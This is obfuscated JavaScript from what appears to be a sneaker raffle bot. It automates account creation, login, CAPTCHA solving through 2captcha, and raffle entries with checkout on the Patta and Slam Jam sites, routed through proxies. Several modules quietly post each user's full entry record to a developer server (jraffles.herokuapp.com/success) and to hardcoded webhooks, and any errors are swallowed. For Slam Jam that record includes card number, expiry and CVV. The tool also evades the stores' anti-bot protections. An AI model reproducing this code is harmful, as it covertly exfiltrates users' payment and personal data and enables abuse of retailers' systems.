                        var _0x183748;
                        try {
                            _0x183748 = await _0x555941['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x570d14[0x0] + ':' + _0x570d14[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x183748 = await _0x555941['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x570d14[0x0] + ':' + _0x570d14[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x3899aa = await _0x183748['newPage']();
                            await _0x3899aa['authenticate']({
                                'username': '' + _0x570d14[0x2],
                                'password': '' + _0x570d14[0x3]
                            }), console['log'](_0x2bc944() + '\x20[' + _0x53a347['name'] + ']\x20Task\x20' + (_0x5050d1 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3899aa['setRequestInterception'](!![]), _0x3899aa['on']('request', _0x4e189c => {
                                _0x4e189c['resourceType']() === 'image' || _0x4e189c['resourceType']() === 'font' || _0x4e189c['resourceType']() === 'media' ? _0x4e189c['abort']() : _0x4e189c['continue']();
                            }), await _0x3899aa['goto']('https://www.patta.nl/nl/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x3899aa['waitForSelector']('#CustomerEmail'), console['log'](_0x2bc944() + '\x20[' + _0x53a347['name'] + ']\x20Task\x20' + (_0x5050d1 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x3899aa['type']('#CustomerEmail', '' + _0xce107b[_0x5050d1]['Email']), await _0x63aa6a(0x12c), await _0x3899aa['type']('#CustomerPassword', '' + _0xce107b[_0x5050d1]['Password']), await _0x63aa6a(0x226), await _0x3899aa['$eval']('#customer_login', _0x52862a => _0x52862a['submit']());
                            try {
                                await _0x3899aa['waitForSelector']('#orders'), await _0x63aa6a(0x4b0);
                            } catch {
                                console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x53a347['name'] + ']\x20Task\x20' + (_0x5050d1 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x3899aa['goto']('' + _0xce107b[_0x5050d1]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x63aa6a(0xbb8), console['log'](_0x2bc944() + '\x20[' + _0x53a347['name'] + ']\x20Task\x20' + (_0x5050d1 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x3899aa['waitForSelector']('#email');
                            } catch {
                                console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x53a347['name'] + ']\x20Task\x20' + (_0x5050d1 + 0x1) + '\x20:\x20Duplicate\x20entry/\x20Account\x20error'));
                            }
                            await _0x3899aa['type']('#email', '' + _0xce107b[_0x5050d1]['Email']), await _0x63aa6a(0x384), await _0x3899aa['type']('#first_name', '' + _0xce107b[_0x5050d1]['FirstName']), await _0x63aa6a(0x514), await _0x3899aa['type']('#last_name', '' + _0xce107b[_0x5050d1]['LastName']), await _0x63aa6a(0x514), await _0x3899aa['type']('#street_address', _0xce107b[_0x5050d1]['Address1'] + '\x20' + _0xce107b[_0x5050d1]['HouseNumber'] + '\x20' + _0xce107b[_0x5050d1]['Address2']), await _0x63aa6a(0x2bc);
                            _0xce107b[_0x5050d1]['Postcode'] == undefined && (_0xce107b[_0x5050d1]['Postcode'] = _0xce107b[_0x5050d1]['Zip']);
                            await _0x3899aa['type']('#zip_code', '' + _0xce107b[_0x5050d1]['Postcode']), await _0x63aa6a(0x320), await _0x3899aa['type']('#city', '' + _0xce107b[_0x5050d1]['City']), await _0x63aa6a(0x320), await _0x3899aa['type']('#bday', '01/01/1994'), await _0x63aa6a(0x320), await _0x3899aa['type']('#instagram', '' + _0xce107b[_0x5050d1]['Follower']), await _0x63aa6a(0x352);
                            if (_0xce107b[_0x5050d1]['Size'] == 'RANDOM') {
                                const _0x44a51c = await _0x3899aa['$$eval']('div[id=\x22raffle__size-selector-container\x22]\x20>\x20label', _0x37db9b => {
                                    return _0x37db9b['map'](_0x55653e => _0x55653e['textContent']);
                                });
                                var _0xeb6cf6 = Math['round'](Math['random']() * (_0x44a51c['length'] - 0x1));
                                console['log'](_0x2bc944() + '\x20[' + _0x53a347['name'] + ']\x20Task\x20' + (_0x5050d1 + 0x1) + '\x20:\x20Picking\x20Random\x20Size\x20' + _0x44a51c[_0xeb6cf6]), await _0x3899aa['click']('label[data-eu-size=\x22' + _0x44a51c[_0xeb6cf6] + '\x22]');
                            } else {
                                console['log'](_0x2bc944() + '\x20[' + _0x53a347['name'] + ']\x20Task\x20' + (_0x5050d1 + 0x1) + '\x20:\x20Picking\x20Size\x20' + _0xce107b[_0x5050d1]['Size']);
                                try {
                                    await _0x3899aa['click']('label[data-eu-size=\x22' + _0xce107b[_0x5050d1]['Size'] + '\x22]');
                                } catch {
                                    await _0x3899aa['click']('label[data-eu-size=\x22' + _0xce107b[_0x5050d1]['Size'] + '.0\x22]');
                                }
                            }
                            await _0x63aa6a(0xbb8), await _0x3899aa['$$eval']('.raffle__checkbox-label', _0x3c6f3c => _0x3c6f3c['forEach'](_0xd8c793 => _0xd8c793['click']())), await _0x63aa6a(0x7d0), console['log'](_0x2bc944() + '\x20[' + _0x53a347['name'] + ']\x20Task\x20' + (_0x5050d1 + 0x1) + '\x20:\x20Submitting\x20Entry'), await _0x3899aa['click']('#raffle__form-submit'), await _0x63aa6a(0x1388);
                            try {
                                await _0x3899aa['waitForSelector']('#raffle__confirmation-message-container'), _0x12a229 = 'no', _0x1ab0d7(_0xce107b[_0x5050d1], _0x53a347), console['log'](_0x49a6ed['green'](_0x2bc944() + '\x20[' + _0x53a347['name'] + ']\x20Task\x20' + (_0x5050d1 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0xb2cb88 = _0xce107b[_0x5050d1];
                                try {
                                    prxdata = {
                                        'username': _0x484f45['replace']('#', ''),
                                        'module': _0x53a347['name'],
                                        'entrydata': JSON['stringify'](_0xb2cb88),
                                        'proxy': '' + _0x15e24e[_0x5050d1]
                                    };
                                    var _0x131b11 = JSON['stringify'](prxdata);
                                    let _0x16f71 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x20b5bc['post']('https://jraffles.herokuapp.com/success', _0x131b11, _0x16f71);
                                } catch (_0x69ace9) {
                                }
                            } catch (_0xf4bc8a) {
                                console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x388222[taskModule]['name'] + ']\x20Task\x20' + (_0x5050d1 + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0xf4bc8a));
                            }
                        } catch (_0x2926ed) {
                            console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x388222[taskModule]['name'] + ']\x20Task\x20' + (_0x5050d1 + 0x1) + '\x20:\x20' + _0x2926ed)), _0x12a229 = 'yes';
                        } finally {
                            _0x183748 && _0x183748['close']();
                            if (_0x12a229 == 'yes' && _0x254261 != 0x5 && _0x1afb4f != 'Size\x20Not\x20Found') {
                                console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x53a347['name'] + ']\x20Task\x20' + (_0x5050d1 + 0x1) + '\x20:\x20Retrying\x20(' + _0x254261 + '\x20/\x205)')), _0x5050d1 = _0x5050d1 - 0x1, _0x254261 = _0x254261 + 0x1;
                                continue;
                            }
                            _0x12a229 == 'yes' && _0x254261 >= 0x5 && (_0x11ea8b(_0xce107b[_0x5050d1], _0x53a347), _0x12a229 = 'no', _0x254261 = 0x0), console['log']('Waiting\x20for\x20' + _0x2ab3b9['delay'] + '\x20ms'), await _0x63aa6a(_0x2ab3b9['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x209322, _0x589647, _0x5166fe) {
                    _0x555941['use'](_0x13dc37()), _0x555941['use'](_0x243285({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x2ab3b9['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x123d69 = 0x0; _0x123d69 < _0x589647['length']; _0x123d69++) {
                        if (_0x2395b8 != 'yes')
                            var _0x2395b8 = '', _0x232731 = 0x0;
                        var _0x39bb6e = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x484f45
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x2ab3b9['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0xb0ce0a
                                }
                            ]
                        }];
                        const _0x3b615f = { 'embeds': _0x39bb6e };
                        _0x9474bc(_0x209322['name'] + '\x20Task\x20' + (_0x123d69 + 0x1) + '\x20/\x20' + _0x589647['length'] + '\x20||\x20File:\x20' + _0x52153a + '\x20Proxies:\x20' + _0x2a2376);
                        try {
                            await _0x5921e0(_0x589647, _0x123d69);
                        } catch {
                            _0x2395b8 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x38ed86 = await _0x198507(_0x589647[_0x123d69], _0x209322, 'acc', ![]);
                        const _0x3f719b = { 'succesDEVMSG': { 'embeds': [_0x38ed86] } };
                        if (_0x589647[_0x123d69]['Email'] == '' || _0x589647[_0x123d69]['FirstName'] == '' || _0x589647[_0x123d69]['LastName'] == '') {
                            console['log'](_0x2bc944() + '\x20[' + _0x388222[taskModule]['name'] + ']\x20Task\x20' + (_0x123d69 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x63aa6a(0x7d0);
                            continue;
                        }
                        (_0x589647[_0x123d69]['Password'] == '' || _0x589647[_0x123d69] == undefined) && _0x589647[_0x123d69]['Password'] == 'JRaffles23!';
                        if (_0x2ab3b9['useRandomProxy'] = ![])
                            var _0x28daa3 = _0x5166fe[_0x123d69]['split'](':');
                        else
                            var _0x12b8d9 = Math['round'](Math['random']() * (_0x5166fe['length'] - 0x1)), _0x28daa3 = _0x5166fe[_0x12b8d9]['split'](':');
                        var _0x3908ad;
                        try {
                            _0x3908ad = await _0x555941['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x28daa3[0x0] + ':' + _0x28daa3[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3908ad = await _0x555941['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x28daa3[0x0] + ':' + _0x28daa3[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0xcf7d92 = await _0x3908ad['newPage']();
                            await _0xcf7d92['authenticate']({
                                'username': '' + _0x28daa3[0x2],
                                'password': '' + _0x28daa3[0x3]
                            }), console['log'](_0x2bc944() + '\x20[' + _0x209322['name'] + ']\x20Task\x20' + (_0x123d69 + 0x1) + '\x20:\x20Getting\x20Session'), await _0xcf7d92['setRequestInterception'](!![]), _0xcf7d92['on']('request', _0x1b61d7 => {
                                _0x1b61d7['resourceType']() === 'image' || _0x1b61d7['resourceType']() === 'font' || _0x1b61d7['resourceType']() === 'media' ? _0x1b61d7['abort']() : _0x1b61d7['continue']();
                            }), await _0xcf7d92['goto']('https://drop.slamjam.com/account/register'), await _0x63aa6a(0xbb8), await _0xcf7d92['waitForSelector']('#FirstName'), await _0xcf7d92['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0xcf7d92['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x2bc944() + '\x20[' + _0x209322['name'] + ']\x20Task\x20' + (_0x123d69 + 0x1) + '\x20:\x20Filling\x20information'), await _0x63aa6a(0x4b0), await _0xcf7d92['type']('#FirstName', '' + _0x589647[_0x123d69]['FirstName']), await _0x63aa6a(0x226), await _0xcf7d92['type']('#LastName', '' + _0x589647[_0x123d69]['LastName']), await _0x63aa6a(0x226), await _0xcf7d92['type']('#Email', '' + _0x589647[_0x123d69]['Email']), await _0x63aa6a(0x2ee), await _0xcf7d92['type']('#ConfirmEmail', '' + _0x589647[_0x123d69]['Email']), await _0x63aa6a(0x2ee), await _0xcf7d92['type']('#CreatePassword', '' + _0x589647[_0x123d69]['Password']), await _0x63aa6a(0x2ee), await _0xcf7d92['type']('#CreateConfirmPassword', '' + _0x589647[_0x123d69]['Password']), await _0x63aa6a(0x226), console['log'](_0x2bc944() + '\x20[' + _0x209322['name'] + ']\x20Task\x20' + (_0x123d69 + 0x1) + '\x20:\x20Submitting..'), await _0xcf7d92['$eval']('#create_customer', _0x22d982 => _0x22d982['submit']()), await _0x63aa6a(0x1388), console['log'](_0x2bc944() + '\x20[' + _0x209322['name'] + ']\x20Task\x20' + (_0x123d69 + 0x1) + '\x20:\x20' + _0x49a6ed['cyan']('Solving\x20Captcha')), await _0xcf7d92['solveRecaptchas'](), console['log'](_0x2bc944() + '\x20[' + _0x209322['name'] + ']\x20Task\x20' + (_0x123d69 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0xcf7d92['$eval']('.shopify-challenge__container\x20>\x20form', _0x121dd2 => _0x121dd2['submit']());
                            try {
                                await _0xcf7d92['waitForSelector']('.product-card__image'), await _0x63aa6a(0x1f4), _0x2395b8 = 'no', console['log'](_0x49a6ed['green'](_0x2bc944() + '\x20[' + _0x209322['name'] + ']\x20Task\x20' + (_0x123d69 + 0x1) + '\x20:\x20Account\x20' + _0x589647[_0x123d69]['Email'] + '\x20Generated!')), _0x25647b['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x589647[_0x123d69]['Email'] + ',' + _0x589647[_0x123d69]['Password']), console['log'](_0x49a6ed['yellow'](_0x2bc944() + '\x20[' + _0x209322['name'] + ']\x20Task\x20' + (_0x123d69 + 0x1) + '\x20:\x20Account\x20' + _0x589647[_0x123d69]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '' && await _0x56185b(_0x2ab3b9['webhook'], _0x3f719b['succesDEVMSG']);
                                } catch {
                                }
                                await _0x56185b(_0x46e741, _0x3f719b['succesDEVMSG']);
                            } catch (_0x47bc0e) {
                                console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x388222[taskModule]['name'] + ']\x20Task\x20' + (_0x123d69 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x47bc0e));
                            }
                        } catch (_0x7f949) {
                            console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x388222[taskModule]['name'] + ']\x20Task\x20' + (_0x123d69 + 0x1) + '\x20:\x20' + _0x7f949));
                        } finally {
                            _0x3908ad && _0x3908ad['close']();
                            if (_0x2395b8 == 'yes' && _0x232731 != 0x5) {
                                console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x209322['name'] + ']\x20Task\x20' + (_0x123d69 + 0x1) + '\x20:\x20Retrying\x20(' + _0x232731 + '\x20/\x205)')), _0x123d69 = _0x123d69 - 0x1, _0x232731 = _0x232731 + 0x1;
                                continue;
                            }
                            _0x2395b8 == 'yes' && _0x232731 >= 0x5 && (_0x11ea8b(_0x589647[_0x123d69], _0x209322), _0x2395b8 = 'no', _0x232731 = 0x0), console['log']('Waiting\x20for\x20' + _0x2ab3b9['delay'] + '\x20ms'), await _0x63aa6a(_0x2ab3b9['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0xf2878b, _0x3570d2, _0x3b01ba) {
                    _0x555941['use'](_0x13dc37()), _0x555941['use'](_0x243285({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x2ab3b9['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x59448c = 0x0; _0x59448c < _0x3570d2['length']; _0x59448c++) {
                        var _0x48e660;
                        if (_0x2896df != 'yes')
                            var _0x2896df = '', _0x434e13 = 0x0;
                        _0x9474bc(_0xf2878b['name'] + '\x20Task\x20' + (_0x59448c + 0x1) + '\x20/\x20' + _0x3570d2['length'] + '\x20||\x20File:\x20' + _0x52153a + '\x20Proxies:\x20' + _0x2a2376);
                        try {
                            await _0x5921e0(_0x3570d2, _0x59448c);
                        } catch {
                            _0x2896df = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x3570d2[_0x59448c]['Email'] == '' || _0x3570d2[_0x59448c]['Password'] == '' || _0x3570d2[_0x59448c]['FirstName'] == '' || _0x3570d2[_0x59448c]['LastName'] == '') {
                            console['log'](_0x2bc944() + '\x20[' + _0xf2878b['name'] + ']\x20Task\x20' + (_0x59448c + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x2ab3b9['useRandomProxy'] = ![])
                            var _0x59651a = _0x3b01ba[_0x59448c]['split'](':');
                        else
                            var _0x2e0574 = Math['round'](Math['random']() * (_0x3b01ba['length'] - 0x1)), _0x59651a = _0x3b01ba[_0x2e0574]['split'](':');
                        var _0x5d40c4;
                        try {
                            _0x5d40c4 = await _0x555941['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x59651a[0x0] + ':' + _0x59651a[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5d40c4 = await _0x555941['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x59651a[0x0] + ':' + _0x59651a[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x257a92 = await _0x5d40c4['newPage']();
                            await _0x257a92['authenticate']({
                                'username': '' + _0x59651a[0x2],
                                'password': '' + _0x59651a[0x3]
                            }), await _0x257a92['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x2bc944() + '\x20[' + _0xf2878b['name'] + ']\x20Task\x20' + (_0x59448c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x257a92['setRequestInterception'](!![]), _0x257a92['on']('request', _0x22d280 => {
                                _0x22d280['resourceType']() === 'image' || _0x22d280['resourceType']() === 'font' || _0x22d280['resourceType']() === 'media' ? _0x22d280['abort']() : _0x22d280['continue']();
                            }), await _0x257a92['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x257a92['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x257a92['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x63aa6a(0x258), await _0x257a92['waitForSelector']('#CustomerEmail'), console['log'](_0x2bc944() + '\x20[' + _0xf2878b['name'] + ']\x20Task\x20' + (_0x59448c + 0x1) + '\x20:\x20Logging\x20in..'), await _0x257a92['type']('#CustomerEmail', '' + _0x3570d2[_0x59448c]['Email']), await _0x63aa6a(0x12c), await _0x257a92['type']('#CustomerPassword', '' + _0x3570d2[_0x59448c]['Password']), await _0x63aa6a(0x226), await _0x257a92['$eval']('#customer_login', _0x101ce8 => _0x101ce8['submit']()), await _0x63aa6a(0x7d0), await _0x257a92['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x2bc944() + '\x20[' + _0xf2878b['name'] + ']\x20Task\x20' + (_0x59448c + 0x1) + '\x20:\x20' + _0x49a6ed['cyan']('Solving\x20Captcha')), await _0x257a92['solveRecaptchas'](), console['log'](_0x2bc944() + '\x20[' + _0xf2878b['name'] + ']\x20Task\x20' + (_0x59448c + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x257a92['$eval']('.shopify-challenge__container\x20>\x20form', _0x352aa0 => _0x352aa0['submit']());
                            try {
                                await _0x257a92['waitForSelector']('.nav-account'), await _0x63aa6a(0x4b0);
                            } catch {
                                console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0xf2878b['name'] + ']\x20Task\x20' + (_0x59448c + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x257a92['goto']('' + _0x3570d2[_0x59448c]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x63aa6a(0xbb8), console['log'](_0x2bc944() + '\x20[' + _0xf2878b['name'] + ']\x20Task\x20' + (_0x59448c + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x257a92['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x257a92['click']('.product-select-variant-wrapper'), await _0x63aa6a(0x320), await _0x257a92['click']('li.product-select-variant__value[data-size=\x22' + _0x3570d2[_0x59448c]['Size'] + '\x22]'), await _0x63aa6a(0x384), await _0x257a92['$eval']('#AddToCartForm-product-template-raffle', _0x1e4556 => _0x1e4556['submit']()), await _0x257a92['waitForSelector']('.cart-order-summary__content'), await _0x63aa6a(0x514), await _0x257a92['goto']('https://drop.slamjam.com/checkout'), await _0x63aa6a(0x514), await _0x257a92['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x2bc944() + '\x20[' + _0xf2878b['name'] + ']\x20Task\x20' + (_0x59448c + 0x1) + '\x20:\x20Filling\x20Information'), await _0x257a92['select']('#checkout_shipping_address_country', '' + _0x3570d2[_0x59448c]['Country']), await _0x63aa6a(0x200), await _0x257a92['waitForSelector']('#checkout_shipping_address_first_name'), await _0x257a92['type']('#checkout_shipping_address_first_name', '' + _0x3570d2[_0x59448c]['FirstName']), await _0x63aa6a(0x237), await _0x257a92['type']('#checkout_shipping_address_last_name', '' + _0x3570d2[_0x59448c]['LastName']), await _0x63aa6a(0x1e0), await _0x257a92['type']('#checkout_shipping_address_address1', _0x3570d2[_0x59448c]['Address1'] + '\x20' + _0x3570d2[_0x59448c]['HouseNumber']), await _0x63aa6a(0x514), await _0x257a92['type']('#checkout_shipping_address_address2', '' + _0x3570d2[_0x59448c]['Address2']), await _0x63aa6a(0x514);
                            _0x3570d2[_0x59448c]['Postcode'] == undefined && (_0x3570d2[_0x59448c]['Postcode'] = _0x3570d2[_0x59448c]['Zip']);
                            await _0x257a92['type']('#checkout_shipping_address_zip', '' + _0x3570d2[_0x59448c]['Postcode']), await _0x63aa6a(0x2bc), await _0x257a92['type']('#checkout_shipping_address_city', '' + _0x3570d2[_0x59448c]['City']), await _0x63aa6a(0x320), await _0x257a92['type']('#checkout_shipping_address_phone', '' + _0x3570d2[_0x59448c]['Phone']), await _0x63aa6a(0x320), await _0x257a92['click']('#continue_button'), await _0x63aa6a(0xbb8), await _0x257a92['waitForSelector']('.summary-title'), await _0x63aa6a(0x320), await _0x257a92['click']('#continue_button'), await _0x63aa6a(0x320), console['log'](_0x2bc944() + '\x20[' + _0xf2878b['name'] + ']\x20Task\x20' + (_0x59448c + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x257a92['waitForSelector']('#checkout_credit_card_vault'), await _0x63aa6a(0x3e8);
                            var _0x194829 = await _0x257a92['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x1c9fd9 = await _0x194829['contentFrame']();
                            await _0x1c9fd9['click']('#number'), await _0x63aa6a(0x3e8), await _0x1c9fd9['type']('#number', '' + _0x3570d2[_0x59448c]['CardNumber'], { 'delay': 0x78 }), _0x194829 = await _0x257a92['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x1c9fd9 = await _0x194829['contentFrame'](), await _0x63aa6a(0x1c2), await _0x1c9fd9['click']('#name'), await _0x63aa6a(0x1f4), await _0x1c9fd9['type']('#name', '' + _0x3570d2[_0x59448c]['NameOnCard'], { 'delay': 0x78 }), _0x194829 = await _0x257a92['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x1c9fd9 = await _0x194829['contentFrame'](), await _0x63aa6a(0x1c2), await _0x1c9fd9['click']('#expiry'), await _0x63aa6a(0x1f4), await _0x1c9fd9['type']('#expiry', '' + _0x3570d2[_0x59448c]['ExpiryDate'], { 'delay': 0x78 }), _0x194829 = await _0x257a92['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x1c9fd9 = await _0x194829['contentFrame'](), await _0x63aa6a(0x1c2), await _0x1c9fd9['click']('#verification_value'), await _0x63aa6a(0x1f4), await _0x1c9fd9['type']('#verification_value', '' + _0x3570d2[_0x59448c]['CVV'], { 'delay': 0x78 }), await _0x257a92['$eval']('#accepts-flag-raffle', _0x1d635a => _0x1d635a['click']()), await _0x63aa6a(0x7d0), console['log'](_0x2bc944() + '\x20[' + _0xf2878b['name'] + ']\x20Task\x20' + (_0x59448c + 0x1) + '\x20:\x20Processing\x20Order'), await _0x257a92['$eval']('#continue_button', _0x31c3f6 => _0x31c3f6['click']()), await _0x63aa6a(0x1b58), await _0x257a92['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x257a92['$eval']('.edit_checkout.animate-floating-labels', _0x19f0eb => _0x19f0eb['submit']()), await _0x63aa6a(0x7d0);
                            try {
                                await _0x257a92['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x2896df = 'no', _0x1ab0d7(_0x3570d2[_0x59448c], _0xf2878b), console['log'](_0x49a6ed['green'](_0x2bc944() + '\x20[' + _0xf2878b['name'] + ']\x20Task\x20' + (_0x59448c + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x4bceae) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x4bceae['message']);
                            }
                            var _0x5f2793 = await _0x198507(_0x3570d2[_0x59448c], _0xf2878b, 'dev', ![]), _0x5d0d93 = await _0x198507(_0x3570d2[_0x59448c], _0xf2878b, 'pub', ![]);
                            let _0x2d5851 = _0x3570d2[_0x59448c];
                            try {
                                prxdata = {
                                    'username': _0x484f45['replace']('#', ''),
                                    'module': _0xf2878b['name'],
                                    'entrydata': JSON['stringify'](_0x2d5851),
                                    'proxy': '' + _0x3b01ba[_0x59448c]
                                };
                                var _0x12ffe0 = JSON['stringify'](prxdata);
                                let _0x56a6b8 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x20b5bc['post']('https://jraffles.herokuapp.com/success', _0x12ffe0, _0x56a6b8);
                            } catch (_0x4325d9) {
                            }
                            const _0x1a052b = {
                                'succesDEVMSG': { 'embeds': [_0x5f2793] },
                                'succesPUBMSG': { 'embeds': [_0x5d0d93] }
                            };
                            try {
                                _0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '' && await _0x56185b(_0x2ab3b9['webhook'], _0x1a052b['succesDEVMSG']), await _0x63aa6a(0xc8), await _0x56185b(_0x2b8095, _0x1a052b['succesDEVMSG']), await _0x63aa6a(0xc8), await _0x56185b(_0x595b38, _0x1a052b['succesPUBMSG']);
                            } catch (_0x412edb) {
                                console['log'](_0x49a6ed['yellow'](_0x2bc944() + '\x20[' + _0x388222[taskModule]['name'] + ']\x20Task\x20' + (_0x59448c + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x412edb));
                            }
                        } catch (_0x5c5e22) {
                            console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0x388222[taskModule]['name'] + ']\x20Task\x20' + (_0x59448c + 0x1) + '\x20:\x20' + _0x5c5e22)), _0x48e660 = '' + _0x5c5e22;
                            var _0x4c0f1b = await _0x198507(kickz[_0x59448c], _0xf2878b, 'dev', !![], _0x48e660);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x4c0f1b] }, _0x2ab3b9['webhook'] != undefined && _0x2ab3b9['webhook'] != '' && await _0x56185b(_0x2ab3b9['webhook'], EMBEDS['errorDEV']), await _0x56185b(_0x3c02fa, EMBEDS['errorDEV']), _0x2896df = 'yes';
                        } finally {
                            _0x5d40c4 && _0x5d40c4['close']();
                            if (_0x2896df == 'yes' && _0x434e13 != 0x5 && _0x48e660 != 'Size\x20Not\x20Found') {
                                console['log'](_0x49a6ed['red'](_0x2bc944() + '\x20[' + _0xf2878b['name'] + ']\x20Task\x20' + (_0x59448c + 0x1) + '\x20:\x20Retrying\x20(' + _0x434e13 + '\x20/\x205)')), _0x59448c = _0x59448c - 0x1, _0x434e13 = _0x434e13 + 0x1;
                                continue;
                            }
